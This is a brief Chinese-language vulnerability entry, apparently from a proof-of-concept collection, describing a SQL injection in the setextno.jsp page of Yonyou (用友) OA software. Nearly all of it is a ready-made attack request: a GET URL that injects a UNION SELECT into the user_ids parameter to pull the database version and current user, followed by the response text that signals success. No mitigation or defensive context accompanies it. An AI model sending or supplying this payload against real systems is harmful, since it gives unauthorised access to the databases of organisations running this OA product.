# 用友OAsetextno.jspSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`GET /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23 HTTP/1.1`
- **响应特征**：-1 分机号